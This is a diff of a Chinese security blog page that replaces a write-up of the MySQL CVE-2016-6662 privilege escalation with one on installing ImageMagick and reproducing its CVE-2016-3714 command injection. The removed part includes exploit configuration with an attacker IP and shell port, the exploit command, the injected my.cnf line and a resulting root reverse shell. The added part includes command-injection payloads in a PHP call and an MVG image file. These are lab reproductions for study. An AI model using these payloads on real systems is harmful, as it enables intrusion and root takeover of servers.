@@ -83,7 +83,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="code execution,mysql," />
+  <meta name="keywords" content="linux,code execution,imageMagick," />
 
 
 
@@ -99,31 +99,19 @@
 
 
 
-<meta name="description" content="概述最近出了一个mysql提权漏洞，趁热练练手。
-利用前提
-mysql_hookandroot_lib.c
-mysql拥有my.cnf写权限
-mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;; sql语句
-需要file权限">
+<meta name="description" content="概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。
+安装123456tar -vxjf ImageMagick-6.9.5-3.tar.bz2 cd ImageMagick-6.9.5-3./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-staticmake">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mysql 提权漏洞 CVE-2016-6662">
-<meta property="og:url" content="http://orleven.com/2016/09/29/mysql-root-code-execution-CVE-2016-6662/index.html">
+<meta property="og:title" content="Linux 安装 ImageMagick 以及命令执行漏洞复现">
+<meta property="og:url" content="http://orleven.com/2017/03/14/imageMagick-linux-code-execution/index.html">
 <meta property="og:site_name" content="Orleven Blog">
-<meta property="og:description" content="概述最近出了一个mysql提权漏洞，趁热练练手。
-利用前提
-mysql_hookandroot_lib.c
-mysql拥有my.cnf写权限
-mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;; sql语句
-需要file权限">
-<meta property="og:updated_time" content="2017-03-14T06:37:42.505Z">
+<meta property="og:description" content="概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。
+安装123456tar -vxjf ImageMagick-6.9.5-3.tar.bz2 cd ImageMagick-6.9.5-3./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-staticmake">
+<meta property="og:updated_time" content="2017-03-14T15:18:29.954Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Mysql 提权漏洞 CVE-2016-6662">
-<meta name="twitter:description" content="概述最近出了一个mysql提权漏洞，趁热练练手。
-利用前提
-mysql_hookandroot_lib.c
-mysql拥有my.cnf写权限
-mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;; sql语句
-需要file权限">
+<meta name="twitter:title" content="Linux 安装 ImageMagick 以及命令执行漏洞复现">
+<meta name="twitter:description" content="概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。
+安装123456tar -vxjf ImageMagick-6.9.5-3.tar.bz2 cd ImageMagick-6.9.5-3./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-staticmake">
 
 
 
@@ -151,13 +139,13 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
 
 
 
-  <link rel="canonical" href="http://orleven.com/2016/09/29/mysql-root-code-execution-CVE-2016-6662/"/>
+  <link rel="canonical" href="http://orleven.com/2017/03/14/imageMagick-linux-code-execution/"/>
 
 
 
 
 
-  <title> Mysql 提权漏洞 CVE-2016-6662 | Orleven Blog </title>
+  <title> Linux 安装 ImageMagick 以及命令执行漏洞复现 | Orleven Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -330,7 +318,7 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://orleven.com/2016/09/29/mysql-root-code-execution-CVE-2016-6662/">
+    <link itemprop="mainEntityOfPage" href="http://orleven.com/2017/03/14/imageMagick-linux-code-execution/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Orleven">
@@ -351,7 +339,7 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
             
             
               
-                Mysql 提权漏洞 CVE-2016-6662
+                Linux 安装 ImageMagick 以及命令执行漏洞复现
               
             
           </h1>
@@ -366,8 +354,8 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-29T19:54:12+08:00">
-                2016-09-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-14T15:19:12Z">
+                2017-03-14
               </time>
             
 
@@ -389,8 +377,8 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/root-code-execution/" itemprop="url" rel="index">
-                    <span itemprop="name">root code execution</span>
+                  <a href="/categories/code-execution/" itemprop="url" rel="index">
+                    <span itemprop="name">code execution</span>
                   </a>
                 </span>
 
@@ -424,25 +412,44 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
       
 
       
-        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近出了一个mysql提权漏洞，趁热练练手。</p>
-<h1 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h1><ul>
-<li>mysql_hookandroot_lib.c</li>
-<li>mysql拥有my.cnf写权限</li>
-<li>mysql root用户可执行 <code>set global general_log_file = &#39;my.cnf&#39;;</code> sql语句</li>
-<li>需要file权限</li>
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。</p>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">tar -vxjf ImageMagick-6.9.5-3.tar.bz2 </div><div class="line"><span class="built_in">cd</span> ImageMagick-6.9.5-3</div><div class="line">./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-static</div><div class="line">make</div><div class="line">make install</div><div class="line">vim ~/.bash_profile</div></pre></td></tr></table></figure>
+<p>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PATH=$PATH:/opt/bokee/ImageMagick/bin</div><div class="line">export LD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/lib</div><div class="line">export DYLD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/lib</div><div class="line">export PATH</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> ~/.bash_profile</div><div class="line">convert -version</div></pre></td></tr></table></figure>
+<p>这样就安装完毕了ImageMagick，下面安装php扩展</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">wget http://pecl.php.net/get/imagick-3.1.2.tgz</div><div class="line">tar zxvf imagick-3.1.2.tgz</div><div class="line"><span class="built_in">cd</span> imagick-3.1.2</div><div class="line">/opt/lampp/bin/phpize <span class="comment"># 据自己的情况找到这个文件运行 find / -name phpize</span></div><div class="line"><span class="built_in">export</span> PKG_CONFIG_PATH=/opt/bokee/ImageMagick/lib/pkgconfig/</div><div class="line"><span class="built_in">export</span> C_INCLUDE_PATH=<span class="variable">$C_INCLUDE_PATH</span>:/opt/bokee/ImageMagick/include/ImageMagick-6/</div><div class="line">./configure --with-imagick=/opt/bokee/ImageMagick</div><div class="line">make</div><div class="line">make install</div><div class="line">ldconfig</div><div class="line">find / -name php.ini</div><div class="line">vi /opt/lampp/etc/php.ini</div><div class="line">添加：extension = <span class="string">"imagick.so"</span></div></pre></td></tr></table></figure>
+<h1 id="错误以及解决方法"><a href="#错误以及解决方法" class="headerlink" title="错误以及解决方法"></a>错误以及解决方法</h1><p>运行/usr/local/webserver/php/bin/phpize时出现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Configuring for:</div><div class="line">PHP Api Version:         20041225</div><div class="line">Zend Module Api No:      20060613</div><div class="line">Zend Extension Api No:   220060519</div><div class="line">Cannot find autoconf. Please check your autoconf installation and the</div><div class="line">$PHP_AUTOCONF environment variable. Then, rerun this script.</div></pre></td></tr></table></figure>
+<p>解决方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">cd /usr/src</div><div class="line">wget http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz</div><div class="line">tar -zvxf m4-1.4.9.tar.gz</div><div class="line">cd m4-1.4.9/</div><div class="line">./configure &amp;&amp; make &amp;&amp; make install</div><div class="line">cd ../</div><div class="line">wget http://ftp.gnu.org/gnu/autoconf/autoconf-2.62.tar.gz</div><div class="line">tar -zvxf autoconf-2.62.tar.gz</div><div class="line">cd autoconf-2.62/</div><div class="line">./configure &amp;&amp; make &amp;&amp; make install</div></pre></td></tr></table></figure>
+<p>如果出现如下错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">configure: error: Cannot find php-config. Please use --with-php-config=PATH</div></pre></td></tr></table></figure>
+<p>解决方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find / -name  php-config</div><div class="line">./configure --with-php-config=/opt/lampp/bin/php-config  --with-imagick=/opt/bokee/ImageMagick</div></pre></td></tr></table></figure>
+<p>如果出现如下错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wand/MagickWand.h: No such file or directory</div></pre></td></tr></table></figure>
+<p>解决方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/</div></pre></td></tr></table></figure>
+<p>如果出现如下错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.</div></pre></td></tr></table></figure>
+<p>解决方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">vi /opt/lampp/lampp</div><div class="line"># XAMPP is currently 32 bit only</div><div class="line">#case `uname -m` in</div><div class="line">#    *_64)</div><div class="line">#    if /opt/lampp/bin/php -v &gt; /dev/null 2&gt;&amp;1</div><div class="line">#    then</div><div class="line">#        :</div><div class="line">#    else</div><div class="line">#        $de &amp;&amp; echo &quot;XAMPP gibt es zur Zeit nur als 32-Bit Applikation. Bitte verwende eine 32-Bit Kompatibilitaetsbibliothek fuer Dein System.&quot;</div><div class="line">#        $de || echo &quot;XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.&quot;</div><div class="line">#        exit</div><div class="line">#    fi</div><div class="line">#    ;;</div><div class="line">#esac</div></pre></td></tr></table></figure>
+<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p>
+<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的.</p>
+<p>在ImageMagick的默认配置文件里可以看到所有的委托：<code>/etc/ImageMagick/delegates.xml</code><br>拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="ImageMagick-popen-utf8命令注入"><a href="#ImageMagick-popen-utf8命令注入" class="headerlink" title="ImageMagick popen_utf8命令注入"></a>ImageMagick popen_utf8命令注入</h2><ul>
+<li>漏洞版本:   ImageMagick 6.9.3-9及以下</li>
 </ul>
-<a id="more"></a>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装mysql-5-6-32"><a href="#安装mysql-5-6-32" class="headerlink" title="安装mysql 5.6.32"></a>安装mysql 5.6.32</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">$ wget http://ftp.kaist.ac.kr/mysql/Downloads/MySQL-5.6/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz</div><div class="line">$ sudo apt-get install libaio-dev（或者libaio1）    </div><div class="line">$ chmod 777 tmp</div><div class="line">$ groupadd  mysql</div><div class="line">$ useradd -r -g mysql mysql</div><div class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/</div><div class="line">$ tar zxvf /tmp/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz </div><div class="line">$ ln <span class="_">-s</span> mysql-5.6.32-linux-glibc2.5-x86_64 mysql</div><div class="line">$ <span class="built_in">cd</span> mysql </div><div class="line">$ chown -R mysql .</div><div class="line">$ chgrp -R mysql .</div><div class="line">$ scripts/mysql_install_db  --user=mysql</div><div class="line">$ chown -R root .</div><div class="line">$ chown -R mysql data</div><div class="line">$ cp my.cnf  /etc/my.cnf</div><div class="line">$ bin/mysqld_safe --user=mysql &amp;</div><div class="line">$ cp support-files/mysql.server  /etc/init.d/mysql.server</div><div class="line">$ ./bin/mysqladmin -u root password <span class="string">'123456'</span></div><div class="line">$ ./bin/mysqladmin -uroot -p123456 shutdown</div><div class="line">$ bin/mysqld_safe --user=mysql &amp;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 如果想在任何地方都能直接使用mysql命令，需要设置环境变量：</span></div><div class="line">$ vi /etc/environment   <span class="comment"># 在PATH=“…”最后添加mysql可执行文件所在路径（在这里是:/usr/local/mysql/bin）</span></div><div class="line">$ <span class="built_in">source</span> /etc/environment</div></pre></td></tr></table></figure>
-<h2 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$ lsb_release <span class="_">-a</span></div><div class="line">No LSB modules are available.</div><div class="line">Distributor ID:	Ubuntu</div><div class="line">Description:	Ubuntu 14.04.4 LTS</div><div class="line">Release:	14.04</div><div class="line">Codename:	trusty</div><div class="line"></div><div class="line"></div><div class="line">$ ./bin/mysqladmin -u root -p version</div><div class="line">Enter password: </div><div class="line">./bin/mysqladmin  Ver 8.42 Distrib 5.6.32, <span class="keyword">for</span> linux-glibc2.5 on x86_64</div><div class="line">Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.</div><div class="line"></div><div class="line">Oracle is a registered trademark of Oracle Corporation and/or its</div><div class="line">affiliates. Other names may be trademarks of their respective</div><div class="line">owners.</div><div class="line"></div><div class="line">Server version		5.6.32</div><div class="line">Protocol version	10</div><div class="line">Connection		Localhost via UNIX socket</div><div class="line">UNIX socket		/tmp/mysql.sock</div><div class="line">Uptime:			2 min 54 sec</div><div class="line"></div><div class="line">Threads: 1  Questions: 10  Slow queries: 0  Opens: 67  Flush tables: 1  Open tables: 60  Queries per second avg: 0.057</div></pre></td></tr></table></figure>
-<h2 id="进程属性"><a href="#进程属性" class="headerlink" title="进程属性"></a>进程属性</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ps -aux | grep mysql</div><div class="line">root        23  0.0  0.0   4440   748 ?        S    10:02   0:00 /bin/sh bin/mysqld_safe --user=mysql</div><div class="line">mysql      122 13.0 45.0 985540 457724 ?       Sl   10:02   0:00 /usr/<span class="built_in">local</span>/mysql/bin/mysqld --basedir=/usr/<span class="built_in">local</span>/mysql --datadir=/usr/<span class="built_in">local</span>/mysql/data --plugin-dir=/usr/<span class="built_in">local</span>/mysql/lib/plugin --user=mysql --log-error=/usr/<span class="built_in">local</span>/mysql/data/d1190820d670.err --pid-file=/usr/<span class="built_in">local</span>/mysql/data/d1190820d670.pid</div></pre></td></tr></table></figure>
-<p>可以看出，mysqld_safe封装脚本是以root权限启动的，而主要的mysqld进程是用较低权限的mysql用户启动的。</p>
-<h1 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h1><p>修改my.cnf权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 将/usr/local/mysql/my.cnf</span></div><div class="line">$ chown mysql:mysql /usr/<span class="built_in">local</span>/mysql/my.cnf</div></pre></td></tr></table></figure></p>
-<p>创建attacker用户，并赋予file，select，insert权限，创建用于实验的数据库pocdb<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE pocdb;</div><div class="line">GRANT FILE ON *.* TO <span class="string">'attacker'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'p0cpass!'</span>;</div><div class="line">GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO <span class="string">'attacker'</span>@<span class="string">'%'</span>;</div></pre></td></tr></table></figure></p>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>修改一下<code>mysql_hookandroot_lib.c</code>的ip，port和my.cnf的位置：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKERS_IP <span class="meta-string">"192.168.0.1"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELL_PORT 6033</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INJECTED_CONF <span class="meta-string">"/usr/local/mysql/my.cnf"</span></span></div></pre></td></tr></table></figure></p>
-<p>修改一下<code>0ldSQL_MySQL_RCE_exploit.py</code>的port和my.cnf的位置,然后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass <span class="string">'p0cpass!'</span> -dbhost 192.168.0.1 -dbname pocdb -mycnf /usr/<span class="built_in">local</span>/mysql/my.cnf</div></pre></td></tr></table></figure></p>
-<p>执行成功后会在my.cnf里添加如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/usr/<span class="built_in">local</span>/mysql/bin/mysqld, Version: 5.6.32 (MySQL Community Server (GPL)). started with:</div><div class="line">Tcp port: 3306  Unix socket: /tmp/mysql.sock</div><div class="line">Time                 Id Command    Argument</div><div class="line">160929  9:37:14     1 Query     select <span class="string">"</span></div><div class="line"></div><div class="line"># 0ldSQL_MySQL_RCE_exploit got here :)</div><div class="line"></div><div class="line">[mysqld]</div><div class="line">malloc_lib='/usr/local/mysql/data/mysql_hookandroot_lib.so'</div><div class="line"></div><div class="line">[abyss]</div><div class="line">" INTO void</div><div class="line">                    1 Query     SET global general_log = off</div></pre></td></tr></table></figure></p>
-<p>虽然直接把日志写在<code>my.cnf</code>里重启mysql时会执行失败，但是不用担心,config_cleanup() 这个函数会清除这些。  </p>
-<p>重启mysql<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Listening on [0.0.0.0] (family 0, port 12344)</div><div class="line">Connection from [192.168.0.4] port 12344 [tcp/*] accepted (family 2, sport 34434)</div><div class="line">whoami</div><div class="line">root</div></pre></td></tr></table></figure></p>
+<p>其实就是文件名引发的命令执行。</p>
+<p>payload :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">new</span> Imagick(<span class="string">'|touch /tmp/niubl'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="ImageMagick-命令注入"><a href="#ImageMagick-命令注入" class="headerlink" title="ImageMagick 命令注入"></a>ImageMagick 命令注入</h2><ul>
+<li>漏洞版本:   ImageMagick 6.9.3-9及以下</li>
+</ul>
+<p>payload :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>将以上内容保存为test.png图片，执行convert test.png 1.png，就会执行命令。</p>
 
       
     </div>
@@ -472,9 +479,11 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
       
         <div class="post-tags">
           
+            <a href="/tags/linux/" rel="tag"># linux</a>
+          
             <a href="/tags/code-execution/" rel="tag"># code execution</a>
           
-            <a href="/tags/mysql/" rel="tag"># mysql</a>
+            <a href="/tags/imageMagick/" rel="tag"># imageMagick</a>
           
         </div>
       
@@ -487,8 +496,8 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/09/27/kali-information-gathering/" rel="next" title="Kali Information Gathering">
-                <i class="fa fa-chevron-left"></i> Kali Information Gathering
+              <a href="/2017/01/21/backdoor-base/" rel="next" title="Backdoor 基础学习">
+                <i class="fa fa-chevron-left"></i> Backdoor 基础学习
               </a>
             
           </div>
@@ -496,10 +505,6 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/10/09/php-serialize-magic/" rel="prev" title="php 序列化以及 magic 学习">
-                php 序列化以及 magic 学习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -648,7 +653,7 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用前提"><span class="nav-number">2.</span> <span class="nav-text">利用前提</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装mysql-5-6-32"><span class="nav-number">3.1.</span> <span class="nav-text">安装mysql 5.6.32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#版本信息"><span class="nav-number">3.2.</span> <span class="nav-text">版本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进程属性"><span class="nav-number">3.3.</span> <span class="nav-text">进程属性</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现准备"><span class="nav-number">4.</span> <span class="nav-text">复现准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现"><span class="nav-number">5.</span> <span class="nav-text">复现</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#错误以及解决方法"><span class="nav-number">3.</span> <span class="nav-text">错误以及解决方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#原理分析"><span class="nav-number">4.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞复现"><span class="nav-number">5.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ImageMagick-popen-utf8命令注入"><span class="nav-number">5.1.</span> <span class="nav-text">ImageMagick popen_utf8命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ImageMagick-命令注入"><span class="nav-number">5.2.</span> <span class="nav-text">ImageMagick 命令注入</span></a></li></ol></li></ol></div>
             
 
           </div>
